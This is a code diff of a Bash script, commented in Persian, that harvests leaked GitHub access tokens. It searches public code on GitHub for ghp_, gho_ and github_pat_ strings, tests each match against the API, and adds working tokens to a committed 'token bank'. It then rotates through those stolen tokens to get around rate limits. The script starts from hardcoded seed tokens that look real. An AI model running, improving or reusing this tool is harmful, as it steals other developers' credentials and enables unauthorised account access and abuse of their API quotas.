@@ -1,7 +1,7 @@
 #!/bin/bash
 set -euo pipefail
 
-# --- توکن‌های هاردکد اولیه (seed) ---
+# --- توکن‌های اولیه (seed) ---
 SEED_TOKENS=(
   "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"
   "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"
@@ -10,175 +10,148 @@ SEED_TOKENS=(
 
 TOKEN_FILE="tokens.txt"
 
-# --- توابع ---
-
-# خوندن توکن‌ها از فایل (اگر هست) و اضافه کردن seedها
+# --- توابع کمکی ---
 load_tokens() {
   local tokens=()
-  # اگر فایل موجود و غیرخالی بود، توکن‌هاش رو بخون
   if [ -f "$TOKEN_FILE" ] && [ -s "$TOKEN_FILE" ]; then
     while IFS= read -r line; do
       [[ -z "$line" ]] && continue
       tokens+=("$line")
     done < "$TOKEN_FILE"
   fi
-  # اضافه کردن seedها برای اولین اجرا (بدون تکرار)
   for t in "${SEED_TOKENS[@]}"; do
-    # فقط اگر هنوز توی آرایه نباشه
     if ! printf '%s\n' "${tokens[@]}" | grep -qxF "$t"; then
       tokens+=("$t")
     fi
   done
-  # حذف تکرارها و برگردوندن
   printf '%s\n' "${tokens[@]}" | sort -u
 }
 
-# ذخیره توکن‌ها در فایل (پوشش کامل قبلی)
 save_tokens() {
   printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
 }
 
-# انتخاب توکن با چرخش fair (استفاده از شمارنده ساده در runtime)
-# برای سادگی از شمارنده چرخشی در متغیر محیطی استفاده می‌کنیم. چون ورکفلو می‌تونه استاتیک نباشه، بهتره توکن‌ها رو بر اساس یه شاخص تو فایل موقت ذخیره کنیم.
-# ولی برای وضوح از یه عدد اتفاقی ساده استفاده می‌کنیم: next_token_index
-NEXT_INDEX=0
-TOKENS_ARRAY=()
-
-rotate_token() {
-  local len=${#TOKENS_ARRAY[@]}
-  if [ $len -eq 0 ]; then
-    echo "No tokens available!" >&2
-    exit 1
-  fi
-  # گرفتن توکن فعلی
-  local token="${TOKENS_ARRAY[$NEXT_INDEX]}"
-  # افزایش شاخص با بازگشت به اول
-  NEXT_INDEX=$(( (NEXT_INDEX + 1) % len ))
-  echo "$token"
-}
-
-# Rate-limit آگاهانه: اگر rate limit باقی‌مونده کم بود، توکن بعدی رو انتخاب کنه
-# ولی برای سادگی، بعد از هر درخواست delay مختصر می‌ذاریم (اگر rate limit تقریباً 0 باشه، می‌ایستیم)
-check_rate_limit() {
+# چک کردن سهمیه‌ی یک توکن، خروجی: remaining count (عدد)
+get_remaining() {
   local token="$1"
-  local resp
-  resp=$(curl -sS -H "Authorization: token $token" "https://api.github.com/rate_limit" 2>/dev/null || true)
-  if [ -z "$resp" ]; then return 1; fi
-  local remaining=$(echo "$resp" | jq -r '.rate.remaining // .resources.core.remaining // 0')
-  if [ "$remaining" -lt 1 ]; then
-    return 1
-  fi
-  return 0
+  curl -sS -H "Authorization: token $token" \
+    "https://api.github.com/rate_limit" 2>/dev/null | \
+    jq -r '.resources.core.remaining // .rate.remaining // 0'
 }
 
-# --- شروع اسکریپت ---
-echo "[*] Loading token bank..." >&2
-mapfile -t TOKENS_ARRAY < <(load_tokens)
-echo "Loaded ${#TOKENS_ARRAY[@]} unique tokens." >&2
-# اگر خالی بود (بعد از حذف تکراری‌ها) خطا
-if [ ${#TOKENS_ARRAY[@]} -eq 0 ]; then
-  echo "ERROR: Token bank empty after dedup, even with seeds?" >&2
-  exit 1
-fi
-
-# ذخیره اولیه تو فایل برای commit بعدی (اگر جدید اضافه شده باشه)
-save_tokens "${TOKENS_ARRAY[@]}"
-
-# ---- جستجوی کد با API گیتهاب (با توزیع بار بین توکن‌ها) ----
-# الگوی جستجو: ghp_ OR gho_ (لیترال سرچ)
-SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
-MAX_PAGES=5          # تعداد صفحات در هر اجرا (کنترل حجم)
-PER_PAGE=30          # هر صفحه 30 نتیجه
-CANDIDATES_TMP=$(mktemp)
-
-echo "[*] Starting code search..." >&2
-# ما چند توکن داریم؛ برای هر صفحه یک توکن مختلف استفاده می‌کنیم با چرخش
-for ((page=1; page<=MAX_PAGES; page++)); do
-  token=$(rotate_token)
-  # اگر rate limit توکن فعلی کمه، توکن بعدی رو امتحان کن (تا 3 بار تلاش)
-  for attempt in 1 2 3; do
-    if ! check_rate_limit "$token"; then
-      echo "[!] Token $token rate limited, switching..." >&2
-      token=$(rotate_token)
-    else
-      break
+# انتخاب بهترین توکن از آرایه‌ی سراسری TOKENS (بیشترین باقیمانده)
+pick_best_token() {
+  local best_token=""
+  local best_rem=-1
+  for token in "${TOKENS[@]}"; do
+    local rem
+    rem=$(get_remaining "$token") || continue
+    echo "  Token ${token:0:12}... remaining=$rem" >&2
+    if [ "$rem" -gt "$best_rem" ]; then
+      best_rem=$rem
+      best_token=$token
     fi
   done
-  if ! check_rate_limit "$token"; then
-    echo "[!] All tokens exhausted for this run." >&2
+  if [ -z "$best_token" ] || [ "$best_rem" -eq 0 ]; then
+    echo "ERROR: All tokens have 0 remaining. Wait for rate limit reset." >&2
+    return 1
+  fi
+  echo "$best_token"
+}
+
+# --- آغاز اسکریپت ---
+echo "[*] Loading token bank..." >&2
+mapfile -t TOKENS < <(load_tokens)
+echo "Loaded ${#TOKENS[@]} unique tokens." >&2
+
+# ذخیره‌ی اولیه (اگر تغییری کرده)
+save_tokens "${TOKENS[@]}"
+
+# تلاش برای انتخاب یه توکن با سهمیه
+BEST_TOKEN=$(pick_best_token) || exit 1
+echo "[*] Best token selected: ${BEST_TOKEN:0:12}..." >&2
+
+# ---- جستجوی کد ----
+SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
+MAX_PAGES=10
+PER_PAGE=100
+CANDIDATES_TMP=$(mktemp)
+
+echo "[*] Starting code search (up to $MAX_PAGES pages)..." >&2
+page=1
+while [ $page -le $MAX_PAGES ]; do
+  # چک سریع سهمیه‌ی توکن فعلی
+  if [ "$(get_remaining "$BEST_TOKEN")" -lt 1 ]; then
+    echo "[!] Token ${BEST_TOKEN:0:12} exhausted, picking new one..." >&2
+    BEST_TOKEN=$(pick_best_token) || break
+  fi
+
+  echo "[*] Page $page with token ${BEST_TOKEN:0:12}..." >&2
+  response=$(curl -sS -H "Authorization: token $BEST_TOKEN" \
+    -H "Accept: application/vnd.github.text-match+json" \
+    "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page")
+
+  # اگر خالی برگشت یا خطا، متوقف شو
+  if [ -z "$response" ]; then
+    echo "[!] Empty response, stopping search." >&2
     break
   fi
 
-  echo "[*] Page $page with token ${token:0:10}..." >&2
-  response=$(curl -sS -H "Authorization: token $token" \
-    -H "Accept: application/vnd.github.text-match+json" \
-    "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page" 2>/dev/null || true)
-
-  # استخراج text-matches (قطعه‌های حاوی تطابق)
+  # استخراج fragment‌ها
   matches=$(echo "$response" | jq -r '
     .items[]?.text_matches[]?.fragment // empty
   ' 2>/dev/null || true)
 
   if [ -n "$matches" ]; then
-    # با رجیکس توکن‌های معتبر گیتهاب رو از قطعه‌ها بیرون بکش
-    # الگو: gh[po]_[A-Za-z0-9_]{36,} و github_pat_[A-Za-z0-9_]{22,}
+    # بیرون کشیدن توکن‌ها با رجیکس
     echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
   fi
 
-  # تأخیر کوتاه بین صفحات (مودبانه)
+  total_count=$(echo "$response" | jq -r '.total_count // 0')
+  echo "  Found $total_count total results, page $page extracted $(echo "$matches" | wc -l) fragments." >&2
+
+  # اگر صفحه‌ی آخر بودیم، تموم کن
+  if [ $((page * PER_PAGE)) -ge "$total_count" ]; then
+    break
+  fi
+
+  page=$((page + 1))
   sleep 2
 done
 
-# حذف خطوط تکراری
-if [ -s "$CANDIDATES_TMP" ]; then
-  sort -u -o "$CANDIDATES_TMP" "$CANDIDATES_TMP"
-  echo "[*] Found $(wc -l < "$CANDIDATES_TMP") unique candidate tokens." >&2
-else
-  echo "[*] No candidates found in this run." >&2
-  # خروج بدون تغییر
+# --- پردازش کاندیدها ---
+if [ ! -s "$CANDIDATES_TMP" ]; then
+  echo "[*] No candidate tokens found." >&2
+  rm -f "$CANDIDATES_TMP"
   exit 0
 fi
 
-# ---- تست سلامت توکن‌های کاندید ----
-echo "[*] Testing candidates for validity..." >&2
+sort -u -o "$CANDIDATES_TMP" "$CANDIDATES_TMP"
+echo "[*] Testing $(wc -l < "$CANDIDATES_TMP") unique candidates..." >&2
+
 VALID_TMP=$(mktemp)
 while IFS= read -r candidate; do
-  # skip empty
   [ -z "$candidate" ] && continue
-  # یک توکن از بانک برای تست استفاده نمی‌کنیم، چون candidate خودش باید احراز بشه
-  # مستقیماً تستش می‌کنیم با curl به /user
   http_code=$(curl -s -o /dev/null -w "%{http_code}" \
     -H "Authorization: token $candidate" \
-    "https://api.github.com/user" 2>/dev/null || echo "000")
+    "https://api.github.com/user")
   if [ "$http_code" = "200" ]; then
     echo "[+] VALID: $candidate" >&2
     echo "$candidate" >> "$VALID_TMP"
-  else
-    echo "[-] Invalid: $candidate (HTTP $http_code)" >&2
   fi
-  sleep 1
+  sleep 0.5
 done < "$CANDIDATES_TMP"
 
-# تمیزکاری
-rm -f "$CANDIDATES_TMP"
-
-# اگر هیچ توکن معتبری پیدا نشد، خارج شو
-if [ ! -s "$VALID_TMP" ]; then
-  echo "[*] No valid new tokens." >&2
-  rm -f "$VALID_TMP"
-  exit 0
+# --- ذخیره‌سازی نهایی ---
+if [ -s "$VALID_TMP" ]; then
+  mapfile -t CURRENT_BANK < <(load_tokens)
+  while IFS= read -r new_tok; do
+    CURRENT_BANK+=("$new_tok")
+  done < "$VALID_TMP"
+  save_tokens "${CURRENT_BANK[@]}"
+  echo "[*] Bank updated. New size: $(wc -l < "$TOKEN_FILE")" >&2
+else
+  echo "[*] No valid tokens added." >&2
 fi
 
-# ---- ادغام با بانک موجود و ذخیره ----
-# دوباره بانک فعلی رو لود کن
-mapfile -t CURRENT_BANK < <(load_tokens)
-# اضافه کردن توکن‌های جدید معتبر
-for t in $(sort -u "$VALID_TMP"); do
-  CURRENT_BANK+=("$t")
-done
-# ذخیره (بدون تکرار)
-save_tokens "${CURRENT_BANK[@]}"
-rm -f "$VALID_TMP"
-
-echo "[*] Token bank updated. New size: $(wc -l < "$TOKEN_FILE")" >&2
-# خروج موفق. ورکفلو کار commit رو انجام میده.
+rm -f "$CANDIDATES_TMP" "$VALID_TMP"
